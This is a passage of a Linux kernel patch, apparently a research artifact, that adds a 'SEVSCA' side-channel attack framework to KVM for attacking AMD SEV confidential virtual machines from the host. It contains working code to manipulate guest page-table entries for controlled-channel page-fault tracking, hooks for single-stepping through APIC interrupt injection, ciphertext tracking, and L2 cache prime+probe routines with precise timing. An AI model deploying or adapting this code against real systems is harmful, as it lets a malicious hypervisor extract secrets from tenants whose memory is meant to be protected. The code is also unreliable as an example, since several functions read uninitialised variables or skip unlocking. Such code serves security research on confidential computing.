@@ -1,0 +1,2006 @@
+From 3c161a35b9fae7a896162c15a8a05a96aaabcffd Mon Sep 17 00:00:00 2001
+From: Ruiyi Zhang <ruiyi.zhang@cispa.de>
+Date: Wed, 12 Feb 2025 16:07:25 +0100
+Subject: [PATCH] SEVSCA host kernel patch
+
+---
+ arch/x86/include/asm/kvm_host.h |   14 +-
+ arch/x86/kvm/mmu/mmu.c          |  125 +++-
+ arch/x86/kvm/mmu/spte.h         |    3 +
+ arch/x86/kvm/mmu/tdp_mmu.c      |  175 ++++-
+ arch/x86/kvm/mmu/tdp_mmu.h      |   15 +-
+ arch/x86/kvm/svm/sev.c          |    4 +-
+ arch/x86/kvm/svm/svm.c          | 1240 ++++++++++++++++++++++++++++++-
+ arch/x86/kvm/svm/svm.h          |   12 +-
+ arch/x86/kvm/svm/vmenter.S      |   10 +
+ arch/x86/kvm/x86.c              |    4 +-
+ mm/page_isolation.c             |    5 +
+ 11 files changed, 1575 insertions(+), 32 deletions(-)
+
+diff --git a/arch/x86/include/asm/kvm_host.h b/arch/x86/include/asm/kvm_host.h
+index 4a68cb3eba78..3895c7707303 100644
+--- a/arch/x86/include/asm/kvm_host.h
++++ b/arch/x86/include/asm/kvm_host.h
+@@ -1959,7 +1959,10 @@ void kvm_mmu_slot_leaf_clear_dirty(struct kvm *kvm,
+ 				   const struct kvm_memory_slot *memslot);
+ void kvm_mmu_invalidate_mmio_sptes(struct kvm *kvm, u64 gen);
+ void kvm_mmu_change_mmu_pages(struct kvm *kvm, unsigned long kvm_nr_mmu_pages);
+-void kvm_zap_gfn_range(struct kvm *kvm, gfn_t gfn_start, gfn_t gfn_end);
++void kvm_zap_gfn_range(struct kvm *kvm, gfn_t gfn_start, gfn_t gfn_end, bool rsvd);
++void kvm_sca_modify_gfn_range(struct kvm *kvm, gfn_t gfn_start, gfn_t gfn_end, u8 flag);
++bool kvm_sca_check_gfn(struct kvm *kvm, gfn_t gfn_start, gfn_t gfn_end, u8 flag);
++u64 kvm_gtop(struct kvm *kvm, gfn_t gfn);
+ 
+ int load_pdptrs(struct kvm_vcpu *vcpu, unsigned long cr3);
+ 
+@@ -2137,6 +2140,15 @@ int kvm_get_nr_pending_nmis(struct kvm_vcpu *vcpu);
+ void kvm_update_dr7(struct kvm_vcpu *vcpu);
+ 
+ int kvm_mmu_unprotect_page(struct kvm *kvm, gfn_t gfn);
++
++bool kvm_unpre_all(struct kvm *kvm, u32 asid, bool rsvd);
++bool kvm_sca_modify_all(struct kvm *kvm, u32 asid, u8 flag);
++bool kvm_sca_modify_gfn(struct kvm *kvm, gfn_t gfn, u32 asid, u8 flag);
++bool kvm_check_gfn(struct kvm *kvm, gfn_t gfn, u32 asid, u8 flag);
++bool kvm_unpre_gfn(struct kvm *kvm, gfn_t gfn, u32 asid, bool rsvd);
++bool kvm_unpre_all_except_gfn(struct kvm *kvm, gfn_t gfn, u32 asid, bool rsvd);
++u64 kvm_gfn_to_pfn(struct kvm *kvm, gfn_t gfn, u32 asid);
++
+ void kvm_mmu_free_roots(struct kvm *kvm, struct kvm_mmu *mmu,
+ 			ulong roots_to_free);
+ void kvm_mmu_free_guest_mode_roots(struct kvm *kvm, struct kvm_mmu *mmu);
+diff --git a/arch/x86/kvm/mmu/mmu.c b/arch/x86/kvm/mmu/mmu.c
+index 928cf84778b0..18a4e2fddc44 100644
+--- a/arch/x86/kvm/mmu/mmu.c
++++ b/arch/x86/kvm/mmu/mmu.c
+@@ -3552,6 +3552,63 @@ static int fast_page_fault(struct kvm_vcpu *vcpu, struct kvm_page_fault *fault)
+ 	return ret;
+ }
+ 
++u64 kvm_gfn_to_pfn(struct kvm *kvm, gfn_t gfn, u32 asid)
++{
++	return kvm_gtop(kvm, gfn);
++}
++EXPORT_SYMBOL_GPL(kvm_gfn_to_pfn);
++
++bool kvm_unpre_gfn(struct kvm *kvm, gfn_t gfn, u32 asid, bool rsvd)
++{
++	kvm_zap_gfn_range(kvm, gfn, gfn+1, rsvd);
++
++	return true;
++}
++EXPORT_SYMBOL_GPL(kvm_unpre_gfn);
++
++bool kvm_unpre_all(struct kvm *kvm, u32 asid, bool rsvd)
++{
++	kvm_zap_gfn_range(kvm, 0, 0xFFFFFFFFFFFFFFFF, rsvd);
++
++	return true;
++}
++EXPORT_SYMBOL_GPL(kvm_unpre_all);
++
++bool kvm_unpre_all_except_gfn(struct kvm *kvm, gfn_t gfn, u32 asid, bool rsvd)
++{
++	kvm_zap_gfn_range(kvm, 0, gfn, rsvd);
++	kvm_zap_gfn_range(kvm, gfn+1, 0xFFFFFFFFFFFFFFFF, rsvd);
++
++	return true;
++}
++EXPORT_SYMBOL_GPL(kvm_unpre_all_except_gfn);
++
++bool kvm_sca_modify_all(struct kvm *kvm, u32 asid, u8 flag)
++{
++	kvm_sca_modify_gfn_range(kvm, 0, 0xFFFFFFFFFFFFFFFF, flag);
++
++	return true;
++}
++EXPORT_SYMBOL_GPL(kvm_sca_modify_all);
++
++bool kvm_sca_modify_gfn(struct kvm *kvm, gfn_t gfn, u32 asid, u8 flag)
++{
++	kvm_sca_modify_gfn_range(kvm, gfn, gfn+1, flag);
++
++	return true;
++}
++EXPORT_SYMBOL_GPL(kvm_sca_modify_gfn);
++
++bool kvm_check_gfn(struct kvm *kvm, gfn_t gfn, u32 asid, u8 flag)
++{
++	bool res;
++
++	res = kvm_sca_check_gfn(kvm, gfn, gfn+1, flag);
++
++	return res;
++}
++EXPORT_SYMBOL_GPL(kvm_check_gfn);
++
+ static void mmu_free_root_page(struct kvm *kvm, hpa_t *root_hpa,
+ 			       struct list_head *invalid_list)
+ {
+@@ -6541,7 +6598,7 @@ static bool kvm_rmap_zap_gfn_range(struct kvm *kvm, gfn_t gfn_start, gfn_t gfn_e
+  * Invalidate (zap) SPTEs that cover GFNs from gfn_start and up to gfn_end
+  * (not including it)
+  */
+-void kvm_zap_gfn_range(struct kvm *kvm, gfn_t gfn_start, gfn_t gfn_end)
++void kvm_zap_gfn_range(struct kvm *kvm, gfn_t gfn_start, gfn_t gfn_end, bool rsvd)
+ {
+ 	bool flush;
+ 
+@@ -6557,7 +6614,35 @@ void kvm_zap_gfn_range(struct kvm *kvm, gfn_t gfn_start, gfn_t gfn_end)
+ 	flush = kvm_rmap_zap_gfn_range(kvm, gfn_start, gfn_end);
+ 
+ 	if (tdp_mmu_enabled)
+-		flush = kvm_tdp_mmu_zap_leafs(kvm, gfn_start, gfn_end, flush);
++		flush = kvm_tdp_mmu_zap_leafs(kvm, gfn_start, gfn_end, flush, rsvd);
++
++	if (flush)
++		kvm_flush_remote_tlbs_range(kvm, gfn_start, gfn_end - gfn_start);
++
++	kvm_mmu_invalidate_end(kvm);
++
++	write_unlock(&kvm->mmu_lock);
++}
++
++/*
++ * Invalidate (zap) SPTEs that cover GFNs from gfn_start and up to gfn_end
++ * (not including it)
++ */
++void kvm_sca_modify_gfn_range(struct kvm *kvm, gfn_t gfn_start, gfn_t gfn_end, u8 flag)
++{
++	bool flush;
++
++	if (WARN_ON_ONCE(gfn_end <= gfn_start))
++		return;
++
++	write_lock(&kvm->mmu_lock);
++
++	kvm_mmu_invalidate_begin(kvm);
++
++	kvm_mmu_invalidate_range_add(kvm, gfn_start, gfn_end);
++
++	if (tdp_mmu_enabled)
++		flush = kvm_tdp_mmu_sca_modify_leafs(kvm, gfn_start, gfn_end, flush, flag);
+ 
+ 	if (flush)
+ 		kvm_flush_remote_tlbs_range(kvm, gfn_start, gfn_end - gfn_start);
+@@ -6567,6 +6652,42 @@ void kvm_zap_gfn_range(struct kvm *kvm, gfn_t gfn_start, gfn_t gfn_end)
+ 	write_unlock(&kvm->mmu_lock);
+ }
+ 
++bool kvm_sca_check_gfn(struct kvm *kvm, gfn_t gfn_start, gfn_t gfn_end, u8 flag)
++{
++	bool res;
++
++	if (WARN_ON_ONCE(gfn_end <= gfn_start))
++		return false;
++
++	write_lock(&kvm->mmu_lock);
++
++	kvm_mmu_invalidate_begin(kvm);
++
++	kvm_mmu_invalidate_range_add(kvm, gfn_start, gfn_end);
++
++	if (tdp_mmu_enabled)
++		res = kvm_tdp_mmu_sca_check_leafs(kvm, gfn_start, gfn_end, res, flag);
++
++	kvm_mmu_invalidate_end(kvm);
++
++	write_unlock(&kvm->mmu_lock);
++
++	return res;
++}
++
++/*
++ * Return PFN SPTEs that cover GFN of gfn
++ */
++u64 kvm_gtop(struct kvm *kvm, gfn_t gfn)
++{
++	u64 pfn = 0;
++
++	if (tdp_mmu_enabled)
++		pfn = kvm_tdp_gfn_to_pfn_high(kvm, gfn, gfn+1);
++
++	return pfn;
++}
++
+ static bool slot_rmap_write_protect(struct kvm *kvm,
+ 				    struct kvm_rmap_head *rmap_head,
+ 				    const struct kvm_memory_slot *slot)
+diff --git a/arch/x86/kvm/mmu/spte.h b/arch/x86/kvm/mmu/spte.h
+index ef793c459b05..7d23836bd932 100644
+--- a/arch/x86/kvm/mmu/spte.h
++++ b/arch/x86/kvm/mmu/spte.h
+@@ -167,6 +167,9 @@ static_assert(!(SHADOW_NONPRESENT_VALUE & SPTE_MMU_PRESENT_MASK));
+ #define SHADOW_NONPRESENT_VALUE	0ULL
+ #endif
+ 
++#define SPTE_SCA_CF_MASK BIT_ULL(56)
++#define SPTE_SCA_MA_MASK BIT_ULL(55)
++
+ extern u64 __read_mostly shadow_host_writable_mask;
+ extern u64 __read_mostly shadow_mmu_writable_mask;
+ extern u64 __read_mostly shadow_nx_mask;
+diff --git a/arch/x86/kvm/mmu/tdp_mmu.c b/arch/x86/kvm/mmu/tdp_mmu.c
+index c7dc49ee7388..c10570f848cd 100644
+--- a/arch/x86/kvm/mmu/tdp_mmu.c
++++ b/arch/x86/kvm/mmu/tdp_mmu.c
+@@ -846,7 +846,7 @@ bool kvm_tdp_mmu_zap_sp(struct kvm *kvm, struct kvm_mmu_page *sp)
+  * operation can cause a soft lockup.
+  */
+ static bool tdp_mmu_zap_leafs(struct kvm *kvm, struct kvm_mmu_page *root,
+-			      gfn_t start, gfn_t end, bool can_yield, bool flush)
++			      gfn_t start, gfn_t end, bool can_yield, bool flush, bool rsvd)
+ {
+ 	struct tdp_iter iter;
+ 
+@@ -867,7 +867,15 @@ static bool tdp_mmu_zap_leafs(struct kvm *kvm, struct kvm_mmu_page *root,
+ 		    !is_last_spte(iter.old_spte, iter.level))
+ 			continue;
+ 
+-		tdp_mmu_iter_set_spte(kvm, &iter, SHADOW_NONPRESENT_VALUE);
++		if (rsvd) {
++			/* not present */
++			if (!(iter.old_spte & 1))
++				continue;
++			
++			tdp_mmu_iter_set_spte(kvm, &iter, iter.old_spte & (BIT_ULL(63)-2) );
++		}
++		else
++			tdp_mmu_iter_set_spte(kvm, &iter, SHADOW_NONPRESENT_VALUE);
+ 
+ 		/*
+ 		 * Zappings SPTEs in invalid roots doesn't require a TLB flush,
+@@ -886,22 +894,177 @@ static bool tdp_mmu_zap_leafs(struct kvm *kvm, struct kvm_mmu_page *root,
+ 	return flush;
+ }
+ 
++static bool tdp_mmu_sca_modify_leafs(struct kvm *kvm, struct kvm_mmu_page *root,
++			      gfn_t start, gfn_t end, bool can_yield, bool flush, u8 flag)
++{
++	struct tdp_iter iter;
++
++	end = min(end, tdp_mmu_max_gfn_exclusive());
++
++	lockdep_assert_held_write(&kvm->mmu_lock);
++
++	rcu_read_lock();
++
++	for_each_tdp_pte_min_level(iter, root, PG_LEVEL_4K, start, end) {
++		if (can_yield &&
++		    tdp_mmu_iter_cond_resched(kvm, &iter, flush, false)) {
++			flush = false;
++			continue;
++		}
++
++		if (!is_shadow_present_pte(iter.old_spte) ||
++		    !is_last_spte(iter.old_spte, iter.level))
++			continue;
++
++		switch (flag) {
++        case 55:
++            iter.old_spte |= SPTE_SCA_MA_MASK;
++            break;
++        case 56:
++            iter.old_spte |= SPTE_SCA_CF_MASK;
++            break;
++        default:
++            if (flag & 4)
++                iter.old_spte &= ~1ULL;
++            else if (flag & 2) {
++                iter.old_spte &= ~2ULL;
++                iter.old_spte &= ~(PT_WRITABLE_MASK | shadow_mmu_writable_mask);
++            }
++            else if (flag & 1)
++                iter.old_spte |= shadow_nx_mask;
++            break;
++        }
++		
++		tdp_mmu_iter_set_spte(kvm, &iter, iter.old_spte);
++		
++
++		/*
++		 * Zappings SPTEs in invalid roots doesn't require a TLB flush,
++		 * see kvm_tdp_mmu_zap_invalidated_roots() for details.
++		 */
++		if (!root->role.invalid)
++			flush = true;
++	}
++
++	rcu_read_unlock();
++
++	/*
++	 * Because this flow zaps _only_ leaf SPTEs, the caller doesn't need
++	 * to provide RCU protection as no 'struct kvm_mmu_page' will be freed.
++	 */
++	return flush;
++}
++
++static bool tdp_mmu_sca_check_leafs(struct kvm *kvm, struct kvm_mmu_page *root,
++			      gfn_t start, gfn_t end, bool can_yield, bool res, u8 flag)
++{
++	struct tdp_iter iter;
++
++	end = min(end, tdp_mmu_max_gfn_exclusive());
++
++	lockdep_assert_held_write(&kvm->mmu_lock);
++
++	rcu_read_lock();
++
++	for_each_tdp_pte_min_level(iter, root, PG_LEVEL_4K, start, end) {
++
++		if (!is_shadow_present_pte(iter.old_spte) ||
++		    !is_last_spte(iter.old_spte, iter.level))
++			continue;
++
++		if (flag == 55) {
++			res = !!(iter.old_spte & SPTE_SCA_MA_MASK);
++		}
++		else if (flag == 56) {
++			res = !!(iter.old_spte & SPTE_SCA_CF_MASK);
++		}
++		else if (flag) {
++			res = is_writable_pte(iter.old_spte);
++		}
++		else {
++			res = is_executable_pte(iter.old_spte);
++		}
++
++		return res;
++	}
++
++	rcu_read_unlock();
++
++	/*
++	 * Because this flow zaps _only_ leaf SPTEs, the caller doesn't need
++	 * to provide RCU protection as no 'struct kvm_mmu_page' will be freed.
++	 */
++	return res;
++}
++
++static u64 kvm_tdp_gfn_to_pfn(struct kvm *kvm, struct kvm_mmu_page *root,
++			      gfn_t start, gfn_t end)
++{
++	struct tdp_iter iter;
++	u64 pfn;
++
++	lockdep_assert_held_write(&kvm->mmu_lock);
++
++	rcu_read_lock();
++
++	for_each_tdp_pte_min_level(iter, root, PG_LEVEL_4K, start, end) {
++		pfn = (iter.old_spte >> 12) & 0xFFFFFFFFFF;
++	}
++
++	rcu_read_unlock();
++
++	return pfn;
++}
++
++u64 kvm_tdp_gfn_to_pfn_high(struct kvm *kvm, gfn_t start, gfn_t end)
++{
++	u64 pfn = 0;
++	struct kvm_mmu_page *root;
++	
++	for_each_valid_tdp_mmu_root_yield_safe(kvm, root, -1)
++		pfn = kvm_tdp_gfn_to_pfn(kvm, root, start, end);
++		
++	return pfn;
++}
++
+ /*
+  * Zap leaf SPTEs for the range of gfns, [start, end), for all *VALID** roots.
+  * Returns true if a TLB flush is needed before releasing the MMU lock, i.e. if
+  * one or more SPTEs were zapped since the MMU lock was last acquired.
+  */
+-bool kvm_tdp_mmu_zap_leafs(struct kvm *kvm, gfn_t start, gfn_t end, bool flush)
++bool kvm_tdp_mmu_zap_leafs(struct kvm *kvm, gfn_t start, gfn_t end, bool flush, bool rsvd)
+ {
+ 	struct kvm_mmu_page *root;
+ 
+ 	lockdep_assert_held_write(&kvm->mmu_lock);
+ 	for_each_valid_tdp_mmu_root_yield_safe(kvm, root, -1)
+-		flush = tdp_mmu_zap_leafs(kvm, root, start, end, true, flush);
++		flush = tdp_mmu_zap_leafs(kvm, root, start, end, true, flush, rsvd);
+ 
+ 	return flush;
+ }
+ 
++bool kvm_tdp_mmu_sca_modify_leafs(struct kvm *kvm, gfn_t start, gfn_t end, bool flush, u8 flag)
++{
++	struct kvm_mmu_page *root;
++
++	lockdep_assert_held_write(&kvm->mmu_lock);
++	for_each_valid_tdp_mmu_root_yield_safe(kvm, root, -1)
++		flush = tdp_mmu_sca_modify_leafs(kvm, root, start, end, true, flush, flag);
++
++	return flush;
++}
++
++bool kvm_tdp_mmu_sca_check_leafs(struct kvm *kvm, gfn_t start, gfn_t end, bool res, u8 flag)
++{
++	struct kvm_mmu_page *root;
++
++	lockdep_assert_held_write(&kvm->mmu_lock);
++	for_each_valid_tdp_mmu_root_yield_safe(kvm, root, -1)
++		res = tdp_mmu_sca_check_leafs(kvm, root, start, end, true, res, flag);
++
++	return res;
++}
++
+ void kvm_tdp_mmu_zap_all(struct kvm *kvm)
+ {
+ 	struct kvm_mmu_page *root;
+@@ -1082,7 +1245,7 @@ static int tdp_mmu_link_sp(struct kvm *kvm, struct tdp_iter *iter,
+ {
+ 	u64 spte = make_nonleaf_spte(sp->spt, !kvm_ad_enabled());
+ 	int ret = 0;
+-
++		
+ 	if (shared) {
+ 		ret = tdp_mmu_set_spte_atomic(kvm, iter, spte);
+ 		if (ret)
+@@ -1192,7 +1355,7 @@ bool kvm_tdp_mmu_unmap_gfn_range(struct kvm *kvm, struct kvm_gfn_range *range,
+ 
+ 	__for_each_tdp_mmu_root_yield_safe(kvm, root, range->slot->as_id, false)
+ 		flush = tdp_mmu_zap_leafs(kvm, root, range->start, range->end,
+-					  range->may_block, flush);
++					  range->may_block, flush, false);
+ 
+ 	return flush;
+ }
+diff --git a/arch/x86/kvm/mmu/tdp_mmu.h b/arch/x86/kvm/mmu/tdp_mmu.h
+index 1b74e058a81c..227d18f5e52f 100644
+--- a/arch/x86/kvm/mmu/tdp_mmu.h
++++ b/arch/x86/kvm/mmu/tdp_mmu.h
+@@ -19,7 +19,10 @@ __must_check static inline bool kvm_tdp_mmu_get_root(struct kvm_mmu_page *root)
+ 
+ void kvm_tdp_mmu_put_root(struct kvm *kvm, struct kvm_mmu_page *root);
+ 
+-bool kvm_tdp_mmu_zap_leafs(struct kvm *kvm, gfn_t start, gfn_t end, bool flush);
++u64 kvm_tdp_gfn_to_pfn_high(struct kvm *kvm, gfn_t start, gfn_t end);
++bool kvm_tdp_mmu_zap_leafs(struct kvm *kvm, gfn_t start, gfn_t end, bool flush, bool rsvd);
++bool kvm_tdp_mmu_sca_modify_leafs(struct kvm *kvm, gfn_t start, gfn_t end, bool flush, u8 flag);
++bool kvm_tdp_mmu_sca_check_leafs(struct kvm *kvm, gfn_t start, gfn_t end, bool flush, u8 flag);
+ bool kvm_tdp_mmu_zap_sp(struct kvm *kvm, struct kvm_mmu_page *sp);
+ void kvm_tdp_mmu_zap_all(struct kvm *kvm);
+ void kvm_tdp_mmu_invalidate_all_roots(struct kvm *kvm);
+@@ -52,6 +55,16 @@ void kvm_tdp_mmu_try_split_huge_pages(struct kvm *kvm,
+ 				      gfn_t start, gfn_t end,
+ 				      int target_level, bool shared);
+ 
++/* ============================ */
++bool kvm_tdp_mmu_unpre_leafs(struct kvm *kvm, int as_id, gfn_t start,
++				 gfn_t end, bool can_yield, bool flush);
++bool kvm_tdp_mmu_zap_stepping_leafs(struct kvm *kvm, gfn_t start,
++				 gfn_t end, bool can_yield, bool flush);
++bool kvm_tdp_mmu_unpre_gfn(struct kvm *kvm, gfn_t gfn, u32 asid, bool flush);
++bool kvm_tdp_mmu_unpre_all(struct kvm *kvm, u32 asid, bool flush);
++bool kvm_tdp_mmu_unpre_all_except_gfn(struct kvm *kvm, gfn_t gfn, u32 asid, bool flush);
++/* ============================ */
++
+ static inline void kvm_tdp_mmu_walk_lockless_begin(void)
+ {
+ 	rcu_read_lock();
+diff --git a/arch/x86/kvm/svm/sev.c b/arch/x86/kvm/svm/sev.c
+index 9badf4fa7e1d..dfd2bcd8b31e 100644
+--- a/arch/x86/kvm/svm/sev.c
++++ b/arch/x86/kvm/svm/sev.c
+@@ -4697,6 +4697,8 @@ void sev_handle_rmp_fault(struct kvm_vcpu *vcpu, gpa_t gpa, u64 error_code)
+ 
+ 	gfn = gpa >> PAGE_SHIFT;
+ 
++	trace_printk("sev_handle_rmp_fault gpa:%llx,err:%llx\n", gpa, error_code);
++
+ 	/*
+ 	 * The only time RMP faults occur for shared pages is when the guest is
+ 	 * triggering an RMP fault for an implicit page-state change from
+@@ -4771,7 +4773,7 @@ void sev_handle_rmp_fault(struct kvm_vcpu *vcpu, gpa_t gpa, u64 error_code)
+ 				    gpa, pfn, ret);
+ 	}
+ 
+-	kvm_zap_gfn_range(kvm, gfn, gfn + PTRS_PER_PMD);
++	kvm_zap_gfn_range(kvm, gfn, gfn + PTRS_PER_PMD, false);
+ out:
+ 	trace_kvm_rmp_fault(vcpu, gpa, pfn, error_code, rmp_level, ret);
+ out_no_trace:
+diff --git a/arch/x86/kvm/svm/svm.c b/arch/x86/kvm/svm/svm.c
+index d6f252555ab3..2c860071f549 100644
+--- a/arch/x86/kvm/svm/svm.c
++++ b/arch/x86/kvm/svm/svm.c
+@@ -10,6 +10,8 @@
+ #include "cpuid.h"
+ #include "pmu.h"
+ 
++#include <linux/mm.h>
++#include <linux/io.h>
+ #include <linux/module.h>
+ #include <linux/mod_devicetable.h>
+ #include <linux/kernel.h>
+@@ -28,6 +30,9 @@
+ #include <linux/rwsem.h>
+ #include <linux/cc_platform.h>
+ #include <linux/smp.h>
++#include <linux/gfp.h>
++#include <linux/hugetlb.h>
++#include <linux/page-isolation.h>
+ 
+ #include <asm/apic.h>
+ #include <asm/perf_event.h>
+@@ -41,6 +46,8 @@
+ #include <asm/traps.h>
+ #include <asm/reboot.h>
+ #include <asm/fpu/api.h>
++#include <asm/tlbflush.h>
++#include <linux/tracepoint.h>
+ 
+ #include <trace/events/ipi.h>
+ 
+@@ -71,6 +78,153 @@ static bool erratum_383_found __read_mostly;
+ 
+ u32 msrpm_offsets[MSRPM_OFFSETS] __read_mostly;
+ 
++/* =============================== SEVSCA FRAMEWORK ================================ */
++
++enum sev_sca_state {
++	SEVSCA_STATE_UNINITIALIZED = 0,  /* initial state */
++	SEVSCA_STATE_INIT,               /* initialization active */
++	SEVSCA_STATE_KERNEL_ACTIVE,      /* kernel activity is occurring */
++	SEVSCA_STATE_ACTIVE,             /* us-space */
++};
++
++/*----------------------------------------------------------------------------
++ * Consolidated SEV SCA context.
++ *----------------------------------------------------------------------------
++ */
++struct sev_sca_ctx {
++	/* controlled page and state */
++	void    *page_va;
++	void    *evict_buffer;
++	enum sev_sca_state state;
++    u64      timer;
++    u64      last_user_retired_instr_num;
++    u64      guest_reschedue_threshold;
++    u64      typearray_gfn;
++
++	u32      apic_interval;
++	u32      cf_npf_num;
++
++	int      guest_reschedue_miss;
++	int      original_apic_delivery_mode;
++	int      original_apic_trig_mode;
++
++	/* Data page tracking */
++	u64      mem_mapped_gfn[8];
++	u64      second_last_cf_npf_gfn;
++	u64      last_cf_npf_gfn;
++	u64      cf_npf_gfn;
++
++	/* PMC control/measurement */
++	u64      msr_ctl[6];
++	u64      msr_ctr[6];
++
++	/* Cache attack data */
++    u64      evict_buffer_pa;
++    u64      prime_probe_no_acc_threshold;
++    u64      prime_probe_one_acc_threshold;
++
++	/* Large arrays */
++    u64      mem_npf_gfn_list[24];      /* Ciphertext Pages */
++    u16      ciphertext_block_list[24][256]; /* Ciphertext */
++    u16      evict_set_offset[64];      /* Cache attack */
++    u16      hsave_page_pad;            /* Cache attack */
++    u16      vmsa_page_pad;				/* Cache attack */
++
++	u8       mem_mapped_queue_size;		/* CF - MAs */
++	u8       mem_npf_gfn_len;			/* Ciphertext Pages */
++
++	u8       pmc_sw;
++	u8       wx_runtime;
++	u8       cf_dead_loop;
++	u8       ma_dead_loop;
++	
++	bool     inject_intr_interception;
++	bool     is_interesting_ma_page;
++	bool     start_injecting_apic;
++	bool     typearray_map;
++	bool     covert_channel_start;
++};
++
++/* */
++static struct sev_sca_ctx sev_ctx = {
++
++	.state = SEVSCA_STATE_UNINITIALIZED,
++	.pmc_sw = 0,
++	.wx_runtime = 0,
++	.typearray_gfn = 0,
++	.typearray_map = false,
++	.covert_channel_start = false,
++	.cf_dead_loop = 0,
++	.ma_dead_loop = 0,
++	.inject_intr_interception = true,
++	.is_interesting_ma_page = false,
++	.start_injecting_apic = false,
++	.timer = 0,
++	.apic_interval = 0,
++	.cf_npf_num = 0,
++	.last_user_retired_instr_num = 0,
++	.guest_reschedue_threshold = 0,
++	.guest_reschedue_miss = 0,
++	.original_apic_delivery_mode = 0,
++	.original_apic_trig_mode = 0,
++	.mem_mapped_queue_size = 0,
++	.second_last_cf_npf_gfn = 0,
++	.last_cf_npf_gfn = 0,
++	.cf_npf_gfn = 0,
++	.msr_ctl = { 0 },
++	.msr_ctr = { 0 },
++	.evict_buffer = NULL,
++	.evict_buffer_pa = 0,
++	.evict_set_offset = { 0 },
++	.hsave_page_pad = 0,
++	.vmsa_page_pad = 0,
++	.prime_probe_no_acc_threshold = 0,
++	.prime_probe_one_acc_threshold = 0,
++	.mem_npf_gfn_list = { 0 },
++	.ciphertext_block_list = { { 0 } },
++	.mem_npf_gfn_len = 0,
++};
++
++#define IS_USER_CODE_FETCH(error_code) (((error_code) & PFERR_FETCH_MASK) && ((error_code) & PFERR_USER_MASK))
++
++#define SEV_STEP_FLAG_BASE_PFN 0x6B7707
++
++#define LOOP_THRESHOLD 5
++#define CACHELINE_SHIFT 6
++#define EVICT_HIGH_PFN 0x780000
++// PMC - 6 GP counters
++#define MSR_AMDSEV_PERF_CTL 0xC0010200
++#define MSR_AMDSEV_PERF_CTR 0xC0010201
++#define MSR_AMDSEV_RESERVE_RANGE_LOW  0xC0011095
++#define MSR_AMDSEV_RESERVE_RANGE_HIGH 0xC0011096
++#define RANGE_HIGH_VALUE 0x700000000
++#define MSR_AMDSEV_RESERVE_WAYS 0xC001109A
++
++#define PRIME_PROBE_NO_ACC_THRESHOLD    1250
++#define PRIME_PROBE_ONE_ACC_THRESHOLD   2400 
++
++#define REP4(X) X X X X
++#define REP3(X) X X X
++#define REP2(X) X X
++#define REP1(X) X
++
++/*--- inline helpers ---*/
++static inline bool is_user_code_page(u64 error_code)
++{
++    return IS_USER_CODE_FETCH(error_code);
++}
++
++static inline bool is_data_page_fault(u64 error_code)
++{
++    const u64 mask = 0x100000006;
++    return ((error_code & mask) == 0x100000002) ||
++           ((error_code & mask) == 0x100000004) ||
++           ((error_code & mask) == 0x100000006);
++}
++
++/* =============================================================== */
++
++
+ /*
+  * Set osvw_len to higher value when updated Revision Guides
+  * are published and we know what the new status bits are
+@@ -263,6 +417,80 @@ static const u32 msrpm_ranges[] = {0, 0xc0000000, 0xc0010000};
+ #define MSRS_RANGE_SIZE 2048
+ #define MSRS_IN_RANGE (MSRS_RANGE_SIZE * 8 / 2)
+ 
++static inline void __attribute__((aligned(0x1000))) maccess(void *p) { 
++	asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); 
++}
++
++static inline u64 rdpru_a(void) {
++	u64 a, d;
++	asm volatile("mfence");
++	asm volatile(".byte 0x0f,0x01,0xfd" : "=a"(a), "=d"(d) : "c"(1) : );
++	a = (d << 32) | a;
++	asm volatile("mfence");
++	return a;
++}
++
++// L2 2048 sets (6 + 11 -> 17)
++static inline void prime_l2_set(void* addr, int C, int D, int L, int S){
++    for (int s = 0; s <= S-D; s+=L) {
++        for(int c = 0; c < C; c++) {
++            for(int d = 0; d < D; d++) {
++                maccess(addr+((s+d)<<17));
++				asm volatile("lfence\n");
++            }
++        }
++    }
++	// asm volatile("mfence\n");
++}
++
++static inline void prime_l2_set_reverse(void* addr, int C, int D, int L, int S){
++    for (int s = S-D; s >= 0; s-=L) {
++        for(int c = 0; c < C; c++) {
++            for(int d = 0; d < D; d++) {
++                maccess(addr+((s+d)<<17));
++				asm volatile("lfence\n");
++            }
++        }
++    }
++	// asm volatile("mfence\n");
++}
++
++/*
++ * tar_mem is the host page number of victim access 
++ * We need to calculate the pad to be xor-ed
++ *
++ */
++// static inline u64 l2_index_pad(uint64_t evc_mem, uint64_t tar_mem) {
++//     u64 pad;
++//     u64 v3 = 0, v4 = 0, v5 = 0, v6 = 0, v7 = 0, v8 = 0, v9 = 0, v10 = 0;
++//     v3  = ((evc_mem >> 28) & 1) ^ ((evc_mem >> 29) & 1) ^ ((tar_mem >> 28) & 1) ^ ((tar_mem >> 29) & 1);
++//     v4  = ((evc_mem >> 27) & 1) ^ ((evc_mem >> 30) & 1) ^ ((tar_mem >> 27) & 1) ^ ((tar_mem >> 30) & 1);
++//     v5  = ((evc_mem >> 26) & 1) ^ ((evc_mem >> 31) & 1) ^ ((tar_mem >> 26) & 1) ^ ((tar_mem >> 31) & 1);
++//     v6  = ((evc_mem >> 25) & 1) ^ ((evc_mem >> 32) & 1) ^ ((tar_mem >> 25) & 1) ^ ((tar_mem >> 32) & 1);
++//     v7  = ((evc_mem >> 24) & 1) ^ ((evc_mem >> 33) & 1) ^ ((tar_mem >> 24) & 1) ^ ((tar_mem >> 33) & 1);
++//     v8  = ((evc_mem >> 23) & 1) ^ ((evc_mem >> 34) & 1) ^ ((tar_mem >> 23) & 1) ^ ((tar_mem >> 34) & 1);
++//     v9  = ((evc_mem >> 22) & 1) ^ ((evc_mem >> 35) & 1) ^ ((tar_mem >> 22) & 1) ^ ((tar_mem >> 35) & 1);
++//     v10 = ((evc_mem >> 21) & 1) ^ ((evc_mem >> 36) & 1) ^ ((tar_mem >> 21) & 1) ^ ((tar_mem >> 36) & 1);
++
++//     pad = (v3 << 3) + (v4 << 4) + (v5 << 5) + (v6 << 6) + (v7 << 7) + (v8 << 8) + (v9 << 9) + (v10 << 10);
++//     return pad;
++// }
++static inline u64 l2_index_pad(uint64_t evc_mem, uint64_t tar_mem)
++{
++    u64 pad = 0;
++    int i;
++    for (i = 0; i < 8; i++) {
++        int lower = 28 - i;
++        int upper = 29 + i;
++        u64 v = (((evc_mem >> lower) & 1ULL) ^
++                 ((evc_mem >> upper) & 1ULL) ^
++                 ((tar_mem >> lower) & 1ULL) ^
++                 ((tar_mem >> upper) & 1ULL));
++        pad |= v << (i + 3);
++    }
++    return pad;
++}
++
